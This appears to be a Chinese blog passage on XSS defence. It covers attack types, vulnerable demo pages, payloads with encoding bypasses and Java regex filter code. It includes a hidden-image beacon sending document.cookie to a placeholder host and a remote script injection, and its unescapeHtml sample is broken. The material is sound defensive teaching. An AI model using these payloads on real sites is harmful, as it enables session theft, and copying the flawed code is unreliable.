[{"title":"XSS漏洞处理","url":"/20250619/409b5317.html","content":"\n# [前端安全系列：XSS篇](https://segmentfault.com/a/1190000019980090)\n\n## XSS攻击\n\n全称跨站脚本攻击，为不和`层叠样式表(Cascading Style Sheets, CSS)`的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中\n\n## XSS攻击的危害\n\n1. 盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号\n2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力\n3. 盗窃企业重要的具有商业价值的资料\n4. 非法转账\n5. 强制发送电子邮件\n6. 网站挂马\n7. 控制受害者机器向其它网站发起攻击\n\n## XSS漏洞的分类\n\n### 本地利用漏洞\n\n这种漏洞存在于浏览器页面中,属于前端自身问题基于DOM文档对象模型的一种漏洞,大概步骤:\n\n1. A给B发送一个恶意构造的URL\n2. B打开恶意URL\n3. B的浏览器页面中包含恶意代码\n4. A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为\n\n通过修改浏览器页面中的DOM(DocumentObjectModel)时，就有可能产生这种漏洞\n\n### 反射式漏洞\n\n服务端没有对数据进行过滤、验证或者编码等处理直接返回前端可能引起的漏洞\n\n1. A给B发送一个恶意构造的URL\n2. B打开目标网站,浏览器将包含恶意代码的数据通过请求传递给服务端,其不加处理直接返回给浏览器\n3. B的浏览器接收到响应后解析并执行的代码中包含恶意代码\n4. A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为\n\n常见于网站搜索栏,登录注册等地方窃取用户cookies或者进行钓鱼欺骗.因为其中涉及到服务端的参与,想要避免需要后端协调.\n\n### 存储式漏洞\n\n类似反射式但是会把未经处理的数据储存在数据库中\n\n1. A将恶意代码提交到目标网站的数据库中\n2. B打开目标网站,服务端将恶意代码从数据库取出拼接在HTML中返回给浏览器\n3. B的浏览器接收到响应后解析并执行的代码中包含恶意代码\n4. A的恶意代码可以拥有B的持有权限,进而获取B的数据或者冒充B的行为\n\n这是属于持久性攻击,涉及范围可能包括所有的访问用户,一般常用网站留言,评论,博客日志等.\n\n### 大致对比\n\n| 类型 | 本地利用              | 反射式                | 存储式                                          |\n| :--: | --------------------- | --------------------- | ----------------------------------------------- |\n| 触发 | 用户打开恶意构造的URL | 用户打开恶意构造的URL | 1. 用户打开恶意构造的URL <br/>2. 攻击者构造脚本 |\n| 储存 | URL                   | URL                   | 数据库                                          |\n| 输出 | 前端                  | 后端                  | 后端                                            |\n| 方式 | DOM                   | HTTP响应              | HTTP响应                                        |\n\n## XSS 常见案例\n\n### 公司网站新上线一个搜索功能,B写了这段代码\n\n```xml\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n        <title>demo</title>\n        <style>\n            input {\n                width: 600px;\n            }\n        </style>\n    </head>\n    <body>\n        <div>\n            input:\n            <input type=\"text\" id=\"in\" />\n            <button type=\"submit\" id=\"submit\">submit</button>\n        </div>\n        <br />\n        <div>\n            output:\n            <input id=\"out\" />\n        </div>\n\n        <script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"></script>\n        <script>\n            $(function() {\n                var $input = $('#in');\n                var $output = $('#out');\n                var $submit = $('#submit');\n\n                $submit.click(function() {\n                    var val = $input.val();\n                    $output.val(val).html(val);\n                });\n            });\n        </script>\n    </body>\n</html>\n```\n\n完整源码可以查看[demo1](https://link.segmentfault.com/?enc=FNz4mkAO1XJLu2iC5i%2FPiw%3D%3D.cmiLfQq4GjBOFv2hua84FGOkLqWF9bOwgmu05qyXEXrGfHQlIS8vcph9iSsQQCdt)\n某天,让A知道之后他输入这么一段代码,然后提交之后发现\n\n```xml\n<script>alert('XSS');</script>\n```\n\n![图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSv-1670834128685-1.png) \n\n类似的用户输入内容都可能被攻击者利用拼接特殊格式的字符串形成恶意代码,通过注入脚本引发潜在风险,浏览器不会区分善恶,只是按照代码解析,于是B想了一个办法告诉浏览器这段内容不该解析,所以改了一下,简单转义输入内容\n\n```javascript\nfunction escapeHtml(text) {\n  return text.replace(/[<>\"&]/g, function(match, pos, originalText) {\n    switch (match) {\n      case '<':\n        return '&lt;';\n      case '>':\n        return '&gt;';\n      case '&':\n        return '&amp;';\n      case '\"':\n        return '&quot;';\n    }\n  });\n}\n\nfunction unescapeHtml(str) {\n  return text.replace(/[<>\"&]/g, function(match, pos, originalText) {\n    switch (match) {\n      case '&lt;':\n        return '<';\n      case '&gt;':\n        return '>';\n      case '&amp;':\n        return '&';\n      case '&quot;':\n        return '\"';\n    }\n  });\n}\n\n$submit.click(function() {\n  var val = escapeHtml($input.val());\n  $output.val(val).html(val);\n});\n```\n\n完整源码可以查看[demo2](https://link.segmentfault.com/?enc=7%2BulsDr5cJb65Dru5wIBLQ%3D%3D.MkzYuT3mLjcpFBshJDeed1lo4CRy1%2B3FKB29NhvTZir3%2FCtA8ETGTLsUMhvFmQXW)\n现在浏览器就不会再执行里面的代码了,实际业务中应该转义的内容不止这么简单\n\n ![图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSp-1670834128685-3.png)\n\n### 基于某些业务,例如登录,订单等需要携带参数或者重定向等信息,B写了这么一个页面\n\n```xml\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>demo</title>\n    </head>\n    <body>\n        <div>\n            output:\n            <input id=\"out\" />\n            <a id=\"jump\">jump</a>\n        </div>\n\n        <script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"></script>\n        <script>\n            $(function() {\n                var $jump = $('#jump');\n                var $output = $('#out');\n                var $submit = $('#submit');\n\n                function getQueryString(name) {\n                    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');\n                    var r = window.location.search.substr(1).match(reg);\n                    if (r != null) return unescape(r[2]);\n                    return null;\n                }\n\n                var val = getQueryString('redirect_to');\n        $output.val(val)\n                $jump.attr('href', val);\n            });\n        </script>\n    </body>\n</html>\n```\n\n完整源码可以查看[demo3](https://link.segmentfault.com/?enc=iN%2FDwn9%2F8fycAncTRlrXKA%3D%3D.DVFSSINJ%2FfLXCiLJLyfw3GVNbolgisMCBONF%2FsmFnz59VkbkSfVqBtyCY%2BdfykrZ)\nA发现一个漏洞,然后发了这个网址给其他人打开\n\n```awk\nhttps://www.test.com/?redirect_to=javascript:alert('XSS')\n```\n\n当他们点击跳转的时候就会触发A故意形成的恶意代码\n\n![图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSa-1670834128685-5.png) \n\n像这种情况B第一想法是检验是否网址格式再渲染界面,所以他这么写\n\n```kotlin\nfunction testUrl(str) {\n  var Expression =\n    '^((https|http|ftp|rtsp|mms)?://)?' +\n    '(([0-9a-z_!~*().&=+$%-]+: )?[0-9a-z_!~*().&=+$%-]+@)?' + //ftp的user@\n    '(([0-9]{1,3}.){3}[0-9]{1,3}|' + // IP形式的URL- 199.194.52.184\n    '([0-9a-z_!~*()-]+.)*' + // 域名- www.\n    '[a-z]{2,6})' + //域名的扩展名\n    '(:[0-9]{1,4})?' + // 端口- :80\n    '((/?)|(/[0-9a-z_!~*().;?:@&=+$,%#-]+)+/?)$';\n  var objExp = new RegExp(Expression);\n  if (objExp.test(str) != true) {\n    return false;\n  } else {\n    return true;\n  }\n}\nvar val = getQueryString('redirect_to');\n$output.val(val);\ntestUrl(val) && $jump.attr('href', val);\n```\n\n完整源码可以查看[demo4](https://link.segmentfault.com/?enc=XG9ZRtG8WVR1AAsTugI%2BMg%3D%3D.jJuFJ1RYX5hcvELG8WL0FshynDkHfxkgMbRrSi7YU84%2FxeqIdUhWT7OBeTEU41oF)\n因为富文本有问题,只能截图.\n\n但是不是每个`a`标签都是用于跳转页面的,例如通过Scheme协议打开APP界面\n\n```routeros\n<a href=\"Scheme协议\">\n```\n\n这样子你就把其他非属性跳转的用法都干掉了,所以B想了想不妥,还是换一种方式禁止,直接判断执行前缀\n\n```kotlin\nvar val = getQueryString('redirect_to');\nvar reg = /javascript:/gi;\n$output.val(val);\n!reg.test(val) && $jump.attr('href', val);\n```\n\n完整源码可以查看[demo5](https://link.segmentfault.com/?enc=GKh%2Bza854rEwRA1V4aHVFw%3D%3D.IAKeiENsJj5PkeI0wWJ6i5cBmzfsu0hp8fYODACE%2B43AikV4MPPB52U3QdRf8QkC)\n因为浏览器不区分大小写,所以需要注意一下.更新版本之后B以为已经堵死这条路了,殊不知A换个方式改成编码或者回车空格等\n\n```ruby\nhttps://www.test.com/?redirect_to=jav ascript:alert('XSS');\nhttps://www.test.com/?redirect_to=javascrip?74:alert('XSS');\n```\n\n这就尴尬了,虽然浏览器并不会执行,但是这些也能完全避开B的拦截规则,也可能会引起其他隐患\n\n### 还有种内联数据用法,将序列化的数据通过URL传递给其他页面使用\n\n```xml\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>demo</title>\n    </head>\n    <body>\n        <div>\n            output:\n            <input id=\"out\" />\n        </div>\n\n        <script src=\"http://libs.baidu.com/jquery/2.0.0/jquery.min.js\"></script>\n        <script>\n            $(function() {\n                var $output = $('#out');\n\n                function getQueryString(name) {\n                    var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');\n                    var r = window.location.search.substr(1).match(reg);\n                    if (r != null) return unescape(r[2]);\n                    return null;\n                }\n\n                var val = JSON.parse(getQueryString('data'));\n                $output.val(val.data).html(val.data);\n            });\n        </script>\n    </body>\n</html>\n```\n\n完整源码可以查看[demo6](https://link.segmentfault.com/?enc=lw1mgiqi%2BgpjsN7XtxGtgQ%3D%3D.kSUSKSu1hIaylfuR9LAXYDYeyafnFTEOJghTWig0wbJBV0b3YrMUzIFvVR4G74cI)\nA可以直接修改URL参数注入代码\n\n```awk\nhttps://www.test.com/?data={\"data\":\"<script>alert(\\\"XSS\\\")</script>\"}\n```\n\n![图片描述](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSt-1670834128685-7.png) \n\n### A通过恶意脚本在页面插入图片自动发起恶意请求\n\n```javascript\nvar img = document.createElement('img');\nimg.src =\n  'http://www.test.com/cheat.html?url=' +\n  escape(window.location.href) +\n  '&content=' +\n  escape(document.cookie);\nimg.style = 'display:none';\ndocument.body.appendChild(img);\n```\n\n完整源码可以查看[demo7](https://link.segmentfault.com/?enc=HyNsNtiso%2FP4qBVkuB3HBg%3D%3D.K5rc87juwtWRDIwIUga7MX1WYXIAHW0fkwI8NBV9olOSDk4sZUlLGfAoOHsEbh8f)\nB让服务端采用了比较简单的办法使用`httponly`禁止JS脚本访问cookies信息让A无法拿到\n\n### A通过事件注入恶意脚本\n\n```dart\nvar img = document.createElement('img');\nimg.src = '#';\nimg.onerror = document.body.appendChild(document.createElement('script')).src =\n  'http://www.test.com/cheat.js';\nimg.style = 'display:none';\ndocument.body.appendChild(img);\n```\n\n完整源码可以查看[demo8](https://link.segmentfault.com/?enc=0E77Ps%2B91Qg%2FBv1D3QCfeA%3D%3D.nfOm9N11kbP9QyK63oB%2Fg0psy1yz3KmkDcTxo8dGIXTtfgSc29jKHGuJTX1Q6XHX)\n当浏览器向web服务器发送请求的时候，一般会带上`Referer`，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。可以让服务端限制必须是白名单才能通过请求达到防盗链功能,但是丢失`Refere`情况比较多,而且容易被恶意修改,所以大多只适用于资源被恶意引用的情况\n\n### A利用浏览器的解码顺序进行混合编码组装\n\n当浏览器进行绘制时，解码顺序分别为 HTML > URL > JS,所以A构造了这么一段代码\n\n```perl\n<a href=\"javascript&#58;alert('\\<%E6%B5%8B%E8%AF%95\\>')\">jump</a>\n```\n\n首先是 HTML 解码，结果为\n\n```perl\n<a href=\"javascript:alert('\\<%E6%B5%8B%E8%AF%95\\>')\">jump</a>\n```\n\n然后是 URL 解码，结果为\n\n```xml\n<a href=\"javascript:alert('\\<测试\\>')\">jump</a>\n```\n\n最后是 JS 解码，结果为\n\n```xml\n<a href=\"javascript:alert('<测试>')\">jump</a>\n```\n\n所以可以攻击的方式很多种,相比于针对处理我们应该先了解相关的攻击方式\n\n## XSS攻击方式\n\n- 所有用户输入内容都有潜在的风险\n\n- 利用`script`标签注入`HTML/Javascript`代码\n\n- 利用拥有`href`和`src`等属性的标签\n\n- 利用空格、回车和Tab等拼接方式绕开拦截\n\n- 利用字符编码绕开拦截（JS支持unicode、eacapes、十六进制、十进制等编码形式）\n\n- 利用`onload`,`onscroll`等事件执行恶意代码\n\n- 利用样式属性`backgrund-image`等执行(听说主流浏览器已处理)\n\n- URL参数\n\n- Cookies\n\n- 请求`header`的`referer`\n\n- 恶意代码拆分组装\n\n- 各种API\n\n  ```stylus\n  // URL相关\n  document.location\n  document.URL\n  document.URLUnencoded\n  document.referrer\n  window.location\n  // 操作dom\n  document.write()\n  document.writeln()\n  document.boby.innerHtml\n  // 特殊函数\n  eval()\n  window.execScript()\n  window.setInterval()\n  window.setTimeout()\n  // 重定向\n  document.location\n  document.URL\n  document.open()\n  window.location.href\n  window.navigate()\n  window.open\n  ```\n\n总的来说分两种类型:\n\n1. 攻击者手动提交恶意代码\n2. 浏览器自动执行恶意代码\n\n## 防御\n\n- 针对上面的案例如果B选择前端进行内容转义,会引起什么问题呢?\n\n  如果攻击者不直接经过前端界面,而是直接自己构造请求就可以破解了\n\n- 但是B是在发送请求之前转义又会有什么问题?\n\n  如果是需要用于界面展示的话,引用到字段的地方都需要处理,大部分模板都会自动转义处理,但是如果用在JS不能直接使用或者计算,例如长度判断等\n\n  需要根据上下文采用不同的转义规则增大处理难度,如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等,所以这更适用于固定类型的内容,例如URL,号码等\n\n### XSS Filter\n\n- 用户提交数据进行验证,只接受限定长度/内容\n- 表单数据指定具体类型\n- 过滤移除特殊的html标签,`script`和`iframe`等\n- 过滤移除特殊的Javascript代码,`javascript:`和事件等\n\n### HTML Entity(举例部分)\n\n| 符号 | 实体编号 |\n| :--: | :------: |\n|  <   |   &lt;   |\n|  >   |   &gt;   |\n|  &   |  &amp;   |\n|  \"   |  &quot;  |\n|  '   |  &apos;  |\n| 空格 |  &nbsp;  |\n\n### 请求限制\n\n- 将重要的Cookie标记为HTTP Only,不能通过客户端脚本读取和修改\n- 设置`referer`防止恶意请求\n- 实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行\n\n\n\n###  防御实现代码举例\n\n```xml\n<!-- 非法参数过滤器 -->\n\t<filter>\n\t\t<filter-name>IllegalCharacterFilter</filter-name>\n\t\t<filter-class>com.hots.ssp.common.safety.IllegalCharacterFilter</filter-class>\n\t\t<init-param>\n\t\t\t<!-- 配置不需要被登录过滤器拦截的链接，只支持配后缀、前缀 及全路径，多个配置用逗号分隔 -->\n\t\t\t<param-name>excludedPaths</param-name>\n\t\t\t<param-value>/images/*,*.jsp, *.css, *.ico</param-value>\n\t\t</init-param>\n\t</filter>\n\t<filter-mapping>\n\t\t<filter-name>IllegalCharacterFilter</filter-name>\n\t\t<url-pattern>/*</url-pattern>\n\t</filter-mapping>\n```\n\n```java\npackage com.dayainfo.ssp.common.safety;\n\nimport org.springframework.util.StringUtils;\n\nimport javax.servlet.*;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class IllegalCharacterFilter implements Filter {\n    /**\n     * 不需要被过滤器拦截的页面 ，主要用于静态资源的放行\n     * 在web.xml中配置filter的init-param\n     */\n    private String excludedPaths;\n    private String[] excludedPathArray;\n\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        // 初始化时读取web.xml中配置的init-param\n        excludedPaths = filterConfig.getInitParameter(\"excludedPaths\");\n        if (!StringUtils.isEmpty(excludedPaths)) {\n            excludedPathArray = excludedPaths.split(\",\");\n        }\n    }\n\n    @Override\n    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) req;\n        HttpServletResponse resp = (HttpServletResponse) res;\n        request.setCharacterEncoding(\"utf-8\");\n        String url = request.getServletPath();// 要访问的url\n        // 判断是否是直接放行的请求\n        if (url.contains(\"/overtime\") || isFilterExcludeRequest(request)) {\n            // 会丢参的访问\n            chain.doFilter(request, res);\n        } else {\n            // 非法请求检查\n            AtomicBoolean checkIllegal = new AtomicBoolean();\n            // 添加X-Frame-Options响应头\n            resp.setCharacterEncoding(\"utf-8\");\n            resp.addHeader(\"X-Frame-Options\", \"SAMEORIGIN\");\n            resp.addHeader(\"X-Download-Options\", \"noopen\");\n            resp.addHeader(\"X-Permitted-Cross-Domain-Policies\", \"master-only\");\n            resp.setHeader(\"strict-transport-security\", \"max-age=16070400; includeSubDomains\");\n            resp.addHeader(\"Referrer-Policy\", \"no-referrer-when-downgrade\");\n            resp.addHeader(\"Set-Cookie\", \"cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly\");\n            request = new MHttpServletRequest(request, checkIllegal);\n            if (checkIllegal.get()) {\n                // 非法请求拦截\n                resp.sendRedirect(\"/publicUser/overtime?state=100011\");\n            }\n            chain.doFilter(request, resp);\n        }\n    }\n\n    @Override\n    public void destroy() {\n    }\n\n    /**\n     * 54\n     * 判断是否是 过滤器直接放行的请求\n     * 55\n     * <br/>主要用于静态资源的放行\n     *\n     * @return 58\n     */\n    private boolean isFilterExcludeRequest(HttpServletRequest request) {\n        if (null != excludedPathArray && excludedPathArray.length > 0) {\n            String url = request.getServletPath();\n            for (String ecludedUrl : excludedPathArray) {\n                if (ecludedUrl.startsWith(\"*.\")) {\n                    // 如果配置的是后缀匹配, 则把前面的*号干掉，然后用endWith来判断\n                    if (url.endsWith(ecludedUrl.substring(1))) {\n                        return true;\n                    }\n                } else if (ecludedUrl.endsWith(\"/*\")) {\n                    if (!ecludedUrl.startsWith(\"/\")) {\n                        // 前缀匹配，必须要是/开头\n                        ecludedUrl = \"/\" + ecludedUrl;\n                    }\n                    // 如果配置是前缀匹配, 则把最后的*号干掉，然后startWith来判断\n                    String prffixStr = request.getContextPath() + ecludedUrl.substring(0, ecludedUrl.length() - 1);\n                    if (url.startsWith(prffixStr)) {\n                        return true;\n                    }\n                } else {\n                    // 如果不是前缀匹配也不是后缀匹配,那就是全路径匹配\n                    if (!ecludedUrl.startsWith(\"/\")) {\n                        // 全路径匹配，也必须要是/开头\n                        ecludedUrl = \"/\" + ecludedUrl;\n                    }\n                    String targetUrl = request.getContextPath() + ecludedUrl;\n                    if (url.equals(targetUrl)) {\n                        return true;\n                    }\n                }\n            }\n        }\n\n        return false;\n\n    }\n}\n```\n\n\n\n```java\npackage com.dayainfo.ssp.common.safety;\n\nimport com.dayainfo.ssp.common.safety.util.XssShieldUtil;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletRequestWrapper;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class MHttpServletRequest extends HttpServletRequestWrapper {\n\n    // 非法请求标记，存在注入嫌疑，禁止访问\n    private final AtomicBoolean checkIllegal;\n\n    public MHttpServletRequest(HttpServletRequest request, AtomicBoolean checkIllegal) {\n        super(request);\n        this.checkIllegal = checkIllegal;\n        doParamFilter();\n    }\n\n    @Override\n    public String getParameter(String name) {\n        final String nameFilter = XssShieldUtil.stripXss(name, checkIllegal);\n        // 返回值之前 先进行过滤\n        final String value = super.getParameter(nameFilter);\n        return XssShieldUtil.stripXss(nameFilter, value, checkIllegal);\n    }\n\n    @Override\n    public String[] getParameterValues(String name) {\n        final String nameFilter = XssShieldUtil.stripXss(name, checkIllegal);\n        // 返回值之前 先进行过滤\n        String[] values = super.getParameterValues(nameFilter);\n        if (values != null) {\n            for (int i = 0; i < values.length; i++) {\n                values[i] = XssShieldUtil.stripXss(nameFilter, values[i], checkIllegal);\n            }\n        }\n        return values;\n    }\n\n    public void doParamFilter() {\n        for (String name : this.getParameterMap().keySet()){\n            this.getParameterValues(name);\n        }\n    }\n}\n```\n\n```java\npackage com.dayainfo.ssp.common.safety.util;\n\nimport com.alibaba.fastjson.JSON;\nimport com.dayainfo.ssp.common.safety.constant.SafeFilterConstant;\nimport com.dayainfo.ssp.common.util.EscapeUnescape;\nimport com.dayainfo.ssp.common.util.StringUtil;\nimport javafx.util.Pair;\nimport org.apache.commons.lang.StringUtils;\nimport org.junit.Test;\n\nimport java.io.*;\nimport java.net.URLDecoder;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\n/**\n * 处理非法字符\n */\npublic class XssShieldUtil {\n    static String decodeParam(String value) {\n        try {\n            if (StringUtils.isEmpty(value)) {\n                return value;\n            }\n            int totalCount = 2;\n            while (value.contains(\"%\") && --totalCount > 0) {\n                value = URLDecoder.decode(value, \"UTF-8\");\n            }\n        } catch (Exception e) {\n            if (e.getClass().getName().contains(\"NumberFormatException\") && value.contains(\"%\")) {\n                value = value.replaceAll(\"%\", \"\");\n            }\n        }\n        if (value.contains(\"%\")) {\n            try {\n                int totalCount = 2;\n                while (value.contains(\"%\") && --totalCount > 0) {\n                    value = EscapeUnescape.unescape(value);\n                }\n            } catch (Exception e) {\n            }\n        }\n        if (value.contains(\"%\")) {\n            System.out.printf(\"【decode失败】：%s\\n\", value);\n        }\n        return value;\n    }\n\n    static boolean checkFilter(String name) {\n        return !StringUtils.isEmpty(name) && SafeFilterConstant.noFilterList.contains(name);\n    }\n\n    public static String stripXss(String name, String value, AtomicBoolean checkIllegal) {\n        if (checkFilter(name)) {\n            return value;\n        }\n        return stripXss(value, checkIllegal);\n    }\n\n    /**\n     * 过滤清理\n     */\n    public static String stripXss(String value, AtomicBoolean checkIllegal) {\n        final String tmpValue = value;\n        // URLDecode\n        value = decodeParam(value);\n        // 放行\n        if (checkFilter(value)) {\n            return value;\n        }\n        if (StringUtils.isEmpty(value)) {\n            return value;\n        }\n        if (patternToEmpty(value)) {\n            // 非法请求，禁止访问\n            checkIllegal.set(true);\n            return null;\n        }\n        // JSON数据通过验证\n        if (isJson(value)) {\n            return value;\n        }\n        // 过滤危险字符\n        value = patternToReplace(value);\n        if (tmpValue != null && !tmpValue.equals(value)) {\n            System.out.printf(\"【%s】----【%s】\\n\", tmpValue, value);\n        }\n        return value;\n    }\n\n    /**\n     * 验证是否直接清理参数内容\n     *\n     * @param value\n     * @return\n     */\n    static boolean patternToEmpty(String value) {\n        Matcher matcher = null;\n        final String testValue = value.toLowerCase(Locale.ROOT);\n        for (Pattern pattern : XssPatternGroup.LIST_PATTERNS_DELETE) {\n            matcher = pattern.matcher(testValue);\n            while (matcher.find()) {\n                if (StringUtil.isEmpty(matcher.group())) {\n                    continue;\n                }\n                return true;\n            }\n        }\n        return false;\n    }\n\n    /**\n     * 验证是否直接替换参数内容\n     *\n     * @param value\n     * @return\n     */\n    static String patternToReplace(String value) {\n        Matcher matcher = null;\n        for (Pattern pattern : XssPatternGroup.LIST_PATTERNS_REPLACE_TO_EMPTY) {\n            matcher = pattern.matcher(value);\n            // 匹配\n            if (matcher.find()) {\n                // 删除相关字符串\n                value = matcher.replaceAll(\"\");\n            }\n        }\n        return value;\n    }\n\n    public static boolean isJson(String json) {\n        boolean result = false;\n        final String testJson = json.toLowerCase(Locale.ROOT);\n        // JSON数据通过验证\n        if (testJson.contains(\"/${\")) {\n            return false;\n        }\n        if ((json.contains(\"{\") && json.contains(\"}\")) || (json.contains(\"[\") && json.contains(\"]\"))) {\n            try {\n                JSON.parse(json);\n                result = true;\n            } catch (Exception e) {\n                System.out.println(\"JSON数据被拦截：\" + json);\n                result = false;\n            }\n        }\n        return result;\n    }\n}\n```\n\n```java\npackage com.dayainfo.ssp.common.safety.util;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.regex.Pattern;\n\n/**\n * @author: DH\n * @date: 2022/4/20\n * @desc:\n */\npublic final class XssPatternGroup {\n    static final List<Pattern> LIST_PATTERNS_DELETE = new ArrayList<>();\n\n    static final List<Pattern> LIST_PATTERNS_REPLACE_TO_EMPTY = new ArrayList<>();\n\n    static {\n        for (Object[] arr : getXssPatternToNullList()) {\n            LIST_PATTERNS_DELETE.add(Pattern.compile((String) arr[0], (Integer) arr[1]));\n        }\n        for (Object[] arr : getXssPatternToEmptyList()) {\n            LIST_PATTERNS_REPLACE_TO_EMPTY.add(Pattern.compile((String) arr[0], (Integer) arr[1]));\n        }\n    }\n\n    /**\n     * 正则匹配上：清空参数所有内容\n     *\n     * @return\n     */\n    private static List<Object[]> getXssPatternToNullList() {\n        List<Object[]> ret = new ArrayList<Object[]>();\n        ret.add(new Object[]{\"<(\\\\S*)(no)?script|</(\\\\S*)(no)?script|<(\\\\S*)iframe|<(\\\\S*)img|<(\\\\S*)svg|<(\\\\S*)audio|\\\\.html\", Pattern.CASE_INSENSITIVE});\n        ret.add(new Object[]{\"window\\\\.location|window\\\\.|\\\\.location|document\\\\.cookie|document\\\\.write|document\\\\.|alert\\\\(.*?\\\\)|window\\\\.open\\\\(*\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"eval\\\\((.*?)\\\\)\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"javascript:|vbscript:|view-source:\", Pattern.CASE_INSENSITIVE});\n        ret.add(new Object[]{\"( href=)|( src=)|(=wrtice\\\\()\", Pattern.CASE_INSENSITIVE});\n        ret.add(new Object[]{\"<+\\\\s*\\\\w*\\\\s*(oncontrolselect|oncopy|oncut|ondataavailable|ondatasetchanged|ondatasetcomplete|ondblclick|ondeactivate|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onerror=|onerroupdate|onfilterchange|onfinish|onfocus|onfocusin|onfocusout|onhelp|onkeydown|onkeypress|onkeyup|onlayoutcomplete|onload|onlosecapture|onmousedown|onmouseenter|onmouseleave|onmousemove|onmousout|onmouseover|onmouseup|onmousewheel|onmove|onmoveend|onmovestart|onabort|onactivate|onafterprint|onafterupdate|onbefore|onbeforeactivate|onbeforecopy|onbeforecut|onbeforedeactivate|onbeforeeditocus|onbeforepaste|onbeforeprint|onbeforeunload|onbeforeupdate|onblur|onbounce|oncellchange|onchange|onclick|oncontextmenu|onpaste|onpropertychange|onreadystatechange|onreset|onresize|onresizend|onresizestart|onrowenter|onrowexit|onrowsdelete|onrowsinserted|onscroll|onselect|onselectionchange|onselectstart|onstart|onstop|onsubmit|onunload)+\\\\s*=+\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        return ret;\n    }\n\n    /**\n     * 正则匹配上：清空参数匹配项\n     */\n    private static List<Object[]> getXssPatternToEmptyList() {\n        List<Object[]> ret = new ArrayList<Object[]>();\n        ret.add(new Object[]{\"expression\\\\((.*?)\\\\)\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"<(\\\"[^\\\"]*\\\"|\\'[^\\']*\\'|[^\\'\\\">])*>\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"&.*?|$.*?|CR.*?|LF.*?|\\\\.*?\", Pattern.CASE_INSENSITIVE});\n        ret.add(new Object[]{\"%22\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"%27\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"%3E\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"%3e\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"%3C\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"%3c\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"<\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\">\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"%\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"$\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"\\\"\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"\\'\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"\\\"\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"'\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"\\\\+\", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL});\n        ret.add(new Object[]{\"\\\\\\\\\", 